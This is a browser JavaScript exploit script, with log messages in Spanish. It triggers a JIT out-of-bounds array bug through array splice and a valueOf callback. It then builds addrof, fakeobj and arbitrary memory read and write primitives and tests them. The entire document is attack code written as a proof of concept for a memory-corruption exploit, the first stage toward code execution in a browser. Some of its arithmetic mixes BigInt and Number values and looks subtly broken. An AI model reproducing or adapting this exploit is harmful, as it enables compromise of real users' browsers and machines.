  <script>
    const log = document.getElementById("log");
    const p = (msg) => log.textContent += msg + "\n";

    const buf = new ArrayBuffer(8);
    const f64 = new Float64Array(buf);
    const u32 = new Uint32Array(buf);

    const f2i = f => {
      f64[0] = f;
      return u32[0] + u32[1] * 0x100000000;
    };

    const i2f = i => {
      u32[0] = i % 0x100000000;
      u32[1] = (i - u32[0]) / 0x100000000;
      return f64[0];
    };

    let oobArr, floatArr, objArr;
    let addrof, fakeobj, read64, write64;

    function triggerOOB() {
      let a = [1.1, 2.2, 3.3];
      function opt(arr, o) {
        return arr.splice(0, o);
      }

      for (let i = 0; i < 10000; i++) opt([1.1, 2.2, 3.3], 1); // trigger JIT

      let corrupted = [1.1, 2.2, 3.3];
      let evil = {
        valueOf: () => {
          corrupted.length = 1;
          floatArr = [1.1, 1.2, 1.3];
          objArr = [{}, {}, {}];
          return 1;
        }
      };

      oobArr = opt(corrupted, evil);
    }

    function setupPrimitives() {
      if (oobArr.length < 20) throw "OOB failure";

      // Buscar overlap con floatArr y objArr
      let floatIdx = -1;
      for (let i = 0; i < 100; i++) {
        if (f2i(oobArr[i]) === 0x0000000100000000) {
          floatIdx = i;
          break;
        }
      }

      if (floatIdx === -1) throw "No floatArr overlap";

      const floatArrIdx = floatIdx;
      const objArrIdx = floatArrIdx + 8;

      // addrof(obj)
      addrof = obj => {
        objArr[0] = obj;
        return f2i(oobArr[objArrIdx]);
      };

      // fakeobj(addr)
      fakeobj = addr => {
        oobArr[objArrIdx] = i2f(addr);
        return objArr[0];
      };

      // read64(addr)
      read64 = addr => {
        oobArr[floatArrIdx + 1] = i2f(addr);
        return f2i(floatArr[0]);
      };

      // write64(addr, val)
      write64 = (addr, val) => {
        oobArr[floatArrIdx + 1] = i2f(addr);
        floatArr[0] = i2f(val);
      };
    }

    function testRW() {
      let obj = { msg: "Hello" };
      let addr = addrof(obj);
      p("[+] Dirección del objeto: 0x" + addr.toString(16));

      let fake = fakeobj(addr);
      p("[+] Fake object construido con éxito");

      let float = i2f(0x4142434445464748n); // 64-bit int
      let tmpBuf = new ArrayBuffer(8);
      let tmpView = new Float64Array(tmpBuf);
      tmpView[0] = float;

      let tmpAddr = addrof(tmpBuf) + 0x20;
      write64(tmpAddr, 0x4141414142424242n);
      let val = read64(tmpAddr);
      p("[+] Lectura de memoria exitosa: 0x" + val.toString(16));
    }

    try {
      triggerOOB();
      setupPrimitives();
      p("[✔] Primitivas listas");
      testRW();
    } catch (e) {
      p("[✘] Error: " + e);
    }
  </script>
